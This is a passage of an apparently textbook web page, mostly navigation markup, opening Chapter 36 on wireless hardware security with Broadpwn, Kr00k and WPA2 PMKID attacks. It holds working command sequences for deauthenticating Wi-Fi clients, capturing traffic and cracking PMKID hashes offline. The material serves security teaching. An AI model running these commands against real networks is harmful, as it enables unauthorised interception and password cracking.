+  <a href="#3644-bleedingbit-cve-2018-16986-cve-2018-7080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.4 BLEEDINGBIT – CVE-2018-16986 / CVE-2018-7080
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-rfid-nfc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5 RFID and NFC Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.5 RFID and NFC Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3651-mifare-classic-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5.1 Mifare Classic Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3652-nfc-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5.2 NFC Relay Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-zigbee" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.6 Zigbee and IEEE 802.15.4 Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-lorawan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.7 LoRa and LoRaWAN Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-rolljam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.8 Rolling Code Security – RollJam Attack
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-automotive-wireless" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9 Automotive Wireless Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.9 Automotive Wireless Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3691-tpms-spoofing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.1 TPMS Spoofing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3692-keyless-entry-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.2 Keyless Entry Relay Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3693-uwb-ranging-apple-carkey" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.3 UWB Ranging (Apple CarKey)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-spectrum-monitoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.10 Spectrum Monitoring Hardware
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-gnuradio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.11 GNU Radio Protocol Decoding
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.12 FPGA Implementation for Wireless Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.13 ASIC Implementation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.14 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.15 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.16 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch36-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.17 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#36171-wi-fi-7-ieee-80211be-2024-security-features-and-mlo-attack-surface" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.1 Wi-Fi 7 (IEEE 802.11be, 2024) — Security Features and MLO Attack Surface
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36172-bluetooth-60-channel-sounding-precise-ranging-and-security-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.2 Bluetooth 6.0 Channel Sounding — Precise Ranging and Security (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36173-cve-2023-45866-blueducky-bluetooth-hid-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.3 CVE-2023-45866 — BlueDucky Bluetooth HID Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36174-bluffs-bluetooth-forward-secrecy-attacks-2023-inria" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.4 BLUFFS — Bluetooth Forward Secrecy Attacks (2023, INRIA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36175-uwb-security-in-apple-u2u3-airdrop-and-car-key-applications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.5 UWB Security in Apple U2/U3 — AirDrop and Car Key Applications
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36176-nfc-relay-attack-evolution-act-android-nfc-relay-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.6 NFC Relay Attack Evolution — ACT Android NFC Relay (2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36177-lorawan-111-security-mitigations-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.7 LoRaWAN 1.1.1 — Security Mitigations (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.18 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch37-confidential-computing-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    37. Confidential Computing Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch38-hardware-security-design-flow-and-eda-tools.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    38. Hardware Security Design Flow and EDA Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch39-chiplet-and-heterogeneous-integration-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    39. Chiplet and Heterogeneous Integration Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="key-standards-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Key Standards Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="security-tools-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Tools Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="further-reading.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Further Reading
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-taxonomy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.1 Wireless Attack Taxonomy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-sdr-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.2 SDR Hardware Platform Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wifi-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3 Wi-Fi Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.3 Wi-Fi Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3631-wi-fi-chipset-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.1 Wi-Fi Chipset Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3632-broadpwn-cve-2017-0561" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.2 Broadpwn – CVE-2017-0561
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3633-kr00k-cve-2019-15126" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.3 Kr00k – CVE-2019-15126
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3634-wpa3-sae-dragonfly-and-pmkid-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.3.4 WPA3 SAE (Dragonfly) and PMKID Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-bluetooth-hw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4 Bluetooth Hardware Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.4 Bluetooth Hardware Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3641-bluetooth-hardware-chipsets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.1 Bluetooth Hardware Chipsets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3642-knob-attack-cve-2019-9506" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.2 KNOB Attack – CVE-2019-9506
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3643-bias-attack-cve-2020-10135" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.3 BIAS Attack – CVE-2020-10135
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3644-bleedingbit-cve-2018-16986-cve-2018-7080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.4.4 BLEEDINGBIT – CVE-2018-16986 / CVE-2018-7080
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-rfid-nfc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5 RFID and NFC Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.5 RFID and NFC Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3651-mifare-classic-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5.1 Mifare Classic Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3652-nfc-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.5.2 NFC Relay Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-zigbee" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.6 Zigbee and IEEE 802.15.4 Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-lorawan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.7 LoRa and LoRaWAN Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-rolljam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.8 Rolling Code Security – RollJam Attack
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-automotive-wireless" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9 Automotive Wireless Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.9 Automotive Wireless Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3691-tpms-spoofing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.1 TPMS Spoofing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3692-keyless-entry-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.2 Keyless Entry Relay Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3693-uwb-ranging-apple-carkey" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.9.3 UWB Ranging (Apple CarKey)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-spectrum-monitoring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.10 Spectrum Monitoring Hardware
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-gnuradio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.11 GNU Radio Protocol Decoding
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.12 FPGA Implementation for Wireless Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.13 ASIC Implementation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.14 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.15 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.16 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch36-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="36.17 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#36171-wi-fi-7-ieee-80211be-2024-security-features-and-mlo-attack-surface" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.1 Wi-Fi 7 (IEEE 802.11be, 2024) — Security Features and MLO Attack Surface
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36172-bluetooth-60-channel-sounding-precise-ranging-and-security-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.2 Bluetooth 6.0 Channel Sounding — Precise Ranging and Security (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36173-cve-2023-45866-blueducky-bluetooth-hid-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.3 CVE-2023-45866 — BlueDucky Bluetooth HID Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36174-bluffs-bluetooth-forward-secrecy-attacks-2023-inria" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.4 BLUFFS — Bluetooth Forward Secrecy Attacks (2023, INRIA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36175-uwb-security-in-apple-u2u3-airdrop-and-car-key-applications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.5 UWB Security in Apple U2/U3 — AirDrop and Car Key Applications
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36176-nfc-relay-attack-evolution-act-android-nfc-relay-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.6 NFC Relay Attack Evolution — ACT Android NFC Relay (2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#36177-lorawan-111-security-mitigations-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.17.7 LoRaWAN 1.1.1 — Security Mitigations (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-wireless-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        36.18 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ch-wireless-hardware-security">Chapter 36: Wireless Hardware Security<a class="headerlink" href="#ch-wireless-hardware-security" title="Permanent link">&para;</a></h1>
+<p>Wireless communications pervade every computing environment, from enterprise Wi-Fi to automotive keyless entry to implantable medical devices. Each wireless standard represents a distinct protocol, frequency band, hardware chipset, and security architecture – many designed years before adversarial radio hardware became widely accessible. Software-Defined Radio (SDR) has fundamentally changed the wireless threat landscape by allowing attackers to receive and transmit arbitrary waveforms with inexpensive commercial hardware (<span class="arithmatex">\(&lt; \$25\)</span> for an RTL-SDR). This chapter examines wireless hardware security across the full spectrum: from Wi-Fi chipset vulnerabilities through Bluetooth impersonation, RFID cloning, proprietary IoT protocols, automotive wireless, and spectrum monitoring.</p>
+<h2 id="sec-wireless-taxonomy"><span class="secnum">36.1</span> Wireless Attack Taxonomy<a class="headerlink" href="#sec-wireless-taxonomy" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-wireless-taxonomy">
+<img class="tikz" src="img/tikz-a538d38759d7.svg" alt="Wireless attack taxonomy: passive attacks require only a receiver; active attacks require an RF transmitter; proximity attacks exploit physical side-channels of wireless hardware operation." loading="lazy">
+<figcaption><strong>Figure 36.1.</strong> Wireless attack taxonomy: passive attacks require only a receiver; active attacks require an RF transmitter; proximity attacks exploit physical side-channels of wireless hardware operation.</figcaption>
+</figure>
+
+<h2 id="sec-sdr-hw"><span class="secnum">36.2</span> SDR Hardware Platform Architecture<a class="headerlink" href="#sec-sdr-hw" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-sdr-arch">
+<img class="tikz" src="img/tikz-5592fb7edbc2.svg" alt="SDR attack platform signal chain: antenna to LNA to quadrature mixer, ADC, FPGA digital down-conversion, USB/PCIe host interface, and GNU Radio processing." loading="lazy">
+<figcaption><strong>Figure 36.2.</strong> SDR attack platform signal chain: antenna to LNA to quadrature mixer, ADC, FPGA digital down-conversion, USB/PCIe host interface, and GNU Radio processing.</figcaption>
+</figure>
+
+<div class="tbl" id="tab-sdr-hw">
+<div class="tbl-caption"><strong>Table 36.1.</strong> SDR hardware platform comparison for wireless security research.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Platform</strong></th>
+<th style="text-align: left;"><strong>RX Range</strong></th>
+<th style="text-align: left;"><strong>TX Range</strong></th>
+<th style="text-align: left;"><strong>BW (MHz)</strong></th>
+<th style="text-align: left;"><strong>ADC bits</strong></th>
+<th style="text-align: left;"><strong>Interface</strong></th>
+<th style="text-align: left;"><strong>Price</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">RTL-SDR v3</td>
+<td style="text-align: left;">500 kHz–1.75 GHz</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;">3.2</td>
+<td style="text-align: left;">8</td>
+<td style="text-align: left;">USB 2.0</td>
+<td style="text-align: left;">$25</td>
+</tr>
+<tr>
+<td style="text-align: left;">HackRF One</td>
+<td style="text-align: left;">1–6,000 MHz</td>
+<td style="text-align: left;">1–6,000 MHz</td>
+<td style="text-align: left;">20</td>
+<td style="text-align: left;">8</td>
+<td style="text-align: left;">USB 2.0</td>
+<td style="text-align: left;">$340</td>
+</tr>
+<tr>
+<td style="text-align: left;">LimeSDR Mini 2.0</td>
+<td style="text-align: left;">10–3,500 MHz</td>
+<td style="text-align: left;">10–3,500 MHz</td>
+<td style="text-align: left;">40</td>
+<td style="text-align: left;">12</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">$180</td>
+</tr>
+<tr>
+<td style="text-align: left;">USRP N210</td>
+<td style="text-align: left;">DC–6,000 MHz</td>
+<td style="text-align: left;">DC–6,000 MHz</td>
+<td style="text-align: left;">100</td>
+<td style="text-align: left;">14</td>
+<td style="text-align: left;">GbE</td>
+<td style="text-align: left;">$1,900</td>
+</tr>
+<tr>
+<td style="text-align: left;">USRP X310</td>
+<td style="text-align: left;">DC–6,000 MHz</td>
+<td style="text-align: left;">DC–6,000 MHz</td>
+<td style="text-align: left;">160</td>
+<td style="text-align: left;">16</td>
+<td style="text-align: left;">10GbE</td>
+<td style="text-align: left;">$4,100</td>
+</tr>
+<tr>
+<td style="text-align: left;">Ettus B210</td>
+<td style="text-align: left;">70–6,000 MHz</td>
+<td style="text-align: left;">70–6,000 MHz</td>
+<td style="text-align: left;">56</td>
+<td style="text-align: left;">12</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">$1,100</td>
+</tr>
+<tr>
+<td style="text-align: left;">BladeRF 2.0 micro</td>
+<td style="text-align: left;">47–6,000 MHz</td>
+<td style="text-align: left;">47–6,000 MHz</td>
+<td style="text-align: left;">56</td>
+<td style="text-align: left;">12</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">$480</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-wifi-hw"><span class="secnum">36.3</span> Wi-Fi Hardware Security<a class="headerlink" href="#sec-wifi-hw" title="Permanent link">&para;</a></h2>
+<h3 id="3631-wi-fi-chipset-overview"><span class="secnum">36.3.1</span> Wi-Fi Chipset Overview<a class="headerlink" href="#3631-wi-fi-chipset-overview" title="Permanent link">&para;</a></h3>
+<p><strong>Broadcom BCM4389</strong> (Wi-Fi 6E, 802.11ax, 2021): 6 GHz band support (IEEE 802.11ax-2021), 4<span class="arithmatex">\(\times\)</span>4 MU-MIMO, 1024-QAM, OFDMA, WPA3-SAE and WPA3-Enterprise (GCMP-256), integrated Bluetooth 5.3 coexistence, fabricated on TSMC 28 nm. Used in: Samsung Galaxy S21+, MacBook Pro (2021).</p>
+<p><strong>Intel AX210</strong> (Wi-Fi 6E, 802.11ax, M.2 card): 6 GHz tri-band (2.4 / 5 / 6 GHz), 2.4 Gbps maximum PHY rate, WPA3-SAE, GCMP-256, Intel’s vPro TLS-encrypted connection profile stored in ME (Management Engine) partition, Bluetooth 5.3 coexistence.</p>
+<p><strong>Qualcomm FastConnect 6900</strong>: Wi-Fi 6E + Bluetooth 5.2 combo, 6 GHz 4<span class="arithmatex">\(\times\)</span>4 MIMO, integrated security: WPA3, OWE (Opportunistic Wireless Encryption, RFC 8110), PMF (Protected Management Frames, 802.11w) mandatory.</p>
+<h3 id="3632-broadpwn-cve-2017-0561"><span class="secnum">36.3.2</span> Broadpwn – CVE-2017-0561<a class="headerlink" href="#3632-broadpwn-cve-2017-0561" title="Permanent link">&para;</a></h3>
+<p>Broadpwn (Nitay Artenstein, Black Hat USA 2017): remote code execution in the Broadcom BCM43xx Wi-Fi chipset firmware (affects BCM4354, BCM4358, BCM4359). The Wi-Fi firmware runs a FullMAC WLAN SoC with an ARM Cortex-R4 processor executing custom RTOS code that handles all 802.11 frame processing.</p>
+<p>Vulnerability: a heap overflow in the TDLS (Tunneled Direct Link Setup) probe response handler; the chipset processes probe response frames from <em>any</em> nearby AP before association. No user interaction required – an attacker broadcasting malformed 802.11 probe responses can trigger the overflow and achieve RCE on the Broadcom FullMAC firmware.</p>
+<p>From the FullMAC firmware, Artenstein pivoted to the host Application Processor (AP) via the SDIO interface that connects the BCM43xx to the host SoC, achieving a Wi-Fi-to-AP full chain exploit.</p>
+<div class="language-text highlight"><pre><span></span><code># Detecting Broadpwn-vulnerable chipsets (Android adb)
+$ adb shell cat /proc/bus/usb/devices | grep -i broadcom
+$ adb shell getprop ro.wifi.channels
+# Patch: Android 2017-07-01 Security Bulletin fixes CVE-2017-0561
+# Verification: adb shell getprop ro.build.version.security_patch
+# Should show 2017-07-01 or later for patched devices
+</code></pre></div>
+<h3 id="3633-kr00k-cve-2019-15126"><span class="secnum">36.3.3</span> Kr00k – CVE-2019-15126<a class="headerlink" href="#3633-kr00k-cve-2019-15126" title="Permanent link">&para;</a></h3>
+<p>Kr00k (Eset Research, RSA 2020): affects Broadcom and Cypress Wi-Fi chips (BCM4335, BCM4339, BCM4358, BCM43596, CYW43455, CYW43012, and others). When the client disassociates from an AP, the chip clears the session TK (Temporal Key) to all-zero bytes: TK = 0x00 x16. Before the TK is cleared, a small number of buffered frames are transmitted using the all-zero TK, decryptable by any observer.</p>
+<p>Attacker procedure:</p>
+<ol>
+<li>
+<p>Send a deauthentication frame (802.11 Mgmt, type 0xC0) to the victim</p>
+</li>
+<li>
+<p>The victim’s chip clears TK and transmits buffered frames with TK=0x00</p>
+</li>
+<li>
+<p>Attacker captures the leaked frames and decrypts with all-zero TK</p>
+</li>
+</ol>
+<p>Over 1 billion affected devices at time of disclosure.</p>
+<div class="language-text highlight"><pre><span></span><code># Kr00k PoC (educational, requires airodump-ng and scapy)
+# Step 1: Monitor mode
+$ sudo airmon-ng start wlan0
+
+# Step 2: Capture frames from victim
+$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Step 3: Send deauth to trigger TK flush
+$ sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# Step 4: Decrypt captured frames using all-zero TK
+$ python3 krcok_decrypt.py --bssid AA:BB:CC:DD:EE:FF --tk 000000000000000000000000000000000000000000000000 --pcap capture-01.cap
+</code></pre></div>
+<h3 id="3634-wpa3-sae-dragonfly-and-pmkid-attack"><span class="secnum">36.3.4</span> WPA3 SAE (Dragonfly) and PMKID Attack<a class="headerlink" href="#3634-wpa3-sae-dragonfly-and-pmkid-attack" title="Permanent link">&para;</a></h3>
+<p><strong>WPA3-SAE</strong> (Simultaneous Authentication of Equals, RFC 7664, IEEE 802.11-2020): Dragonfly key exchange using Elliptic Curve Diffie-Hellman over a password-derived point. Provides forward secrecy: session key not derivable from captured handshake. Resistant to offline dictionary attacks (requires active participation per guess).</p>
+<p><strong>WPA2 PMKID attack</strong> (Jens Steube / Hashcat team, 2018): No client capture needed. The PMKID is included in EAPOL frame 1 from the AP: <span class="arithmatex">\(\text{PMKID} = \text{HMAC-SHA-1-128}(\text{PMK}, \text{"PMK Name"} \| \text{BSSID} \| \text{STA\_MAC})\)</span>. Since PMK = PBKDF2-SHA1(password, SSID, 4096, 32), an attacker captures only the PMKID (from a single EAPOL frame) and performs offline dictionary attack.</p>
+<div class="language-text highlight"><pre><span></span><code># WPA2 PMKID attack using hcxdumptool + hashcat (authorised pentest only)
+# Step 1: Capture PMKID (no client required)
+$ sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
+
+# Step 2: Extract PMKID hash from pcapng
+$ hcxpcapngtool pmkid.pcapng -o pmkid.hc22000
+
+# Step 3: Crack with hashcat (GPU accelerated)
+$ hashcat -m 22000 pmkid.hc22000 rockyou.txt --rules-file best64.rule
+# GPU: RTX 4090 = ~1.8 million PMKIDs/second
+# rockyou.txt: 14.3 million passwords tested in ~8 seconds on RTX 4090
+</code></pre></div>
